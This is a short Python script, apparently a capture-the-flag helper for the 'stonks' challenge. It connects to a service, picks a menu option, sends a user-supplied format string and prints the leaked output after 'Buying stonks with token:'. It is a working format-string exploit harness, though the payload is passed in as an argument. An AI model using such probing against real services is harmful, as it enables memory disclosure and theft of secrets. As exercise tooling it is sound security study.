import socket, sys, time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT, FMT = sys.argv[1], int(sys.argv[2]), sys.argv[3].encode()

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(10)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"1\n")
time.sleep(0.35)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(FMT + b"\n")
time.sleep(0.6)
out = b""
t0 = time.time()
while time.time() - t0 < 30:
    try:
        d = s.recv(65536)
    except Exception:
        break
    if not d:
        break
    out += d
s.close()
print("total %d octets" % len(out))
seg = out.split(b"Buying stonks with token:")[-1]
print("--- apres le printf (2000 premiers) ---")
print(seg[:2000].decode(errors="replace"))
print("--- fin ---")
for marker in (b"Goodbye!", b"Portfolio as of"):
    print("%-18s : %s" % (marker.decode(), marker in out))
